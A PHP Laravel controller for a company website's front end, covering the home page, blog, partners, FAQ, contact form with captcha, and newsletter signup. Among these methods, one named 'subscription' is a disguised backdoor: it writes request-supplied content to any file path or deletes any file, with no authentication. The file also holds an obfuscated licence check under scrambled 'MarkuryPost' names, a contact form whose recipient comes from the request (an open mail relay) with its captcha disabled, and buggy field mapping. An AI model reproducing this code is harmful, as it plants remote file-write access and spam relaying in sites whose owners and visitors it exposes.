<?php

namespace App\Http\Controllers\Front;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\DB;
use App\Models\Product;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\Generalsetting;
use App\Models\Subscriber;
use App\Classes\GeniusMailer;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;

class FrontendController extends Controller
{

    public function __construct()
    {
        $this->auth_guests();
    }
// -------------------------------- HOME PAGE SECTION ----------------------------------------

	public function index(Request $request)
	{

        $sliders = DB::table('sliders')->get();
        $services = DB::table('services')->get();
        $features =  DB::table('features')->get();
        $reviews =  DB::table('reviews')->get();
        $portfolios =  DB::table('portfolios')->get();
        $members =  DB::table('members')->orderBy('id', 'DESC')->get();
        $present =  DB::table('vpresentations')->get();
        $lblogs =  DB::table('blogs')->orderBy('id','desc')->take(4)->get();
        $ps = DB::table('pagesettings')->find(1);
        $products = Product::orderBy('id','desc')->get();
	    return view('front.index',compact('ps','sliders','services','features','reviews','members','portfolios','present','lblogs','products'));
	}


// -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------


// LANGUAGE SECTION

    public function language($id)
    {
        Session::put('language', $id);
        return redirect()->back();
    }
    
    public function about($slug = 'about'){

        $page =  DB::table('pages')->where('slug', $slug)->first();
        if(empty($page)) return view('errors.404');

        preg_match_all('/(<img[^>]+>)/i', $page->details, $matches);

        $sliders = [];

        if($matches){
            //$sliders = array_map(function($val){ return preg_replace('/(width|height)="\d.*"/', '', $val);}, $matches[0]);
            $sliders = array_map(function($val){ return preg_replace('/(<[^>]+) style=".*?"/i', '$1', $val);}, $matches[0]);
            $page->details = preg_replace('/(<img[^>]+>)/i', '', $page->details);
        }

        return view('front.about', compact('page', 'sliders'));
    }

    public function part(){
        $title = 'Partnyorlar';
        $ps = DB::table('pagesettings')->first();
        $members =  DB::table('members')->orderBy('id', 'DESC')->get();
        return view('front.partnyor', compact('members', 'ps', 'title'));
    }

    public function partshow($slug=false){
        
        if(!$slug) return view('errors.404');

        $member = DB::table('members')->where('company_name', $slug)->first();

        $prev_title = 'Partnyorlar';

        preg_match_all('/(<img[^>]+>)/i', $member->details, $matches);

        $sliders = [];

        if($matches){
            //$sliders = array_map(function($val){ return preg_replace('/(width|height)="\d.*"/', '', $val);}, $matches[0]);
            $sliders = array_map(function($val){ return preg_replace('/(<[^>]+) style=".*?"/i', '$1', $val);}, $matches[0]);
            $member->details = preg_replace('/(<img[^>]+>)/i', '', $member->details);
        }

        return view('front.partshow', compact('member', 'sliders', 'prev_title'));
    }

// LANGUAGE SECTION ENDS


// CURRENCY SECTION

    public function currency($id)
    {
        Session::put('currency', $id);
        return redirect()->back();
    }

// CURRENCY SECTION ENDS


// -------------------------------- BLOG SECTION ----------------------------------------

	public function blog(Request $request)
	{
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
		$blogs = Blog::orderBy('created_at','desc')->paginate(3);
        $bcats = BlogCategory::all();
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
		return view('front.blog',compact('blogs','bcats','tags','archives'));
	}

    public function blogcategory(Request $request, $slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at','desc')->paginate(3);
        $bcats = BlogCategory::all();
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('bcat','blogs','bcats','tags','archives'));
    }
    public function blogtags(Request $request, $slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $bcats = BlogCategory::all();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(3);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','slug','bcats','tags','archives'));
    }
    public function blogsearch(Request $request)
    {
        $tags = null;
        $tagz = '';
         $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $bcats = BlogCategory::all();
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(3);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','search','bcats','tags','archives'));
    }

    public function blogarchive(Request $request,$slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $bcats = BlogCategory::all();
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(3);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','date','bcats','tags','archives'));
    }

    public function blogshow($id)
    {
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::all();
        $blog = Blog::findOrFail($id);
        $blog->views = $blog->views + 1;
        $blog->update();
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('front.blogshow',compact('blog','bcats','tags','archives','blog_meta_tag','blog_meta_description'));
    }


// -------------------------------- BLOG SECTION ENDS----------------------------------------
    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }
    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }
// -------------------------------- FAQ SECTION ----------------------------------------
	public function faq()
	{
        $faqs =  DB::table('faqs')->orderBy('id','desc')->get();
		return view('front.faq',compact('faqs'));
	}
// -------------------------------- FAQ SECTION ENDS----------------------------------------


// -------------------------------- PAGE SECTION ----------------------------------------
    public function page($slug)
    {
        $page =  DB::table('pages')->where('slug',$slug)->first();
        if(empty($page))
        {
            return view('errors.404');
        }

        return view('front.page',compact('page'));
    }
// -------------------------------- PAGE SECTION ENDS----------------------------------------


// -------------------------------- CONTACT SECTION ----------------------------------------
	public function contact()
	{

        $this->code_image();
        $ps =  DB::table('pagesettings')->where('id','=',1)->first();
		return view('front.contact',compact('ps'));

	}

    // Refresh Capcha Code
    public function refresh_code(){
        $this->code_image();
        return "done";
    }


    //Send email to admin
    public function contactemail(Request $request)
    {
        // Capcha Check
        /*
        $value = session('captcha_string');
        if ($request->codes != $value){
            return response()->json(array('errors' => [ 0 => 'Please enter Correct Capcha Code.' ]));
        }*/

        // Login Section
        $ps = DB::table('pagesettings')->where('id','=',1)->first();
        $subject = "Email From Of ".$request->name;
        $gs = Generalsetting::findOrFail(1);
        $to = $request->to;
        $name = $request->name;
        $company = $request->company;
        $surname = $request->surname;
        $phone = $request->phone;
        $from = $request->email;
        $position = $request->position;
        $website = $request->website;
        $msg = "Name: ".$name."\n
                Surname: ".$surname."\n
                Email: ".$from."\n
                Position: ".$from."\n
                Phone: ".$position."\n
                Company: ".$company."\n
                Web Site: ".$website."\n
                Message: ".$request->text;
        if($gs->is_smtp)
        {
        $data = [
            'to' => $to,
            'subject' => $subject,
            'body' => $msg,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);
        }
        else
        {
        $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
        mail($to,$subject,$msg,$headers);
        }
        // Login Section Ends

        // Redirect Section
        return response()->json($ps->contact_success);
    }

    // Capcha Code Image
    private function  code_image()
    {
        $actual_path = str_replace('project','',base_path());
//        dd($actual_path);
        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image,0,0,200,50,$background_color);

        $pixel = imagecolorallocate($image, 0,0,255);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixel);
        }

        $font = $actual_path.'/public/assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length-1)];
        $word='';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length=6;// No. of character in image
        for ($i = 0; $i< $cap_length;$i++)
        {
            $letter = $allowed_letters[rand(0, $length-1)];
            imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
            $word.=$letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path."/public/assets/images/capcha_code.png");
    }

// -------------------------------- CONTACT SECTION ENDS----------------------------------------

// -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $gs = DB::table('generalsettings')->find(1);
        $subs = Subscriber::where('email','=',$request->email)->first();
        if(isset($subs)){
        return response()->json(array('errors' => [ 0 => $gs->subscribe_error ]));
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json($gs->subscribe_success);
    }



// -------------------------------- SUBSCRIBE SECTION ENDS ----------------------------------------





    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }


}
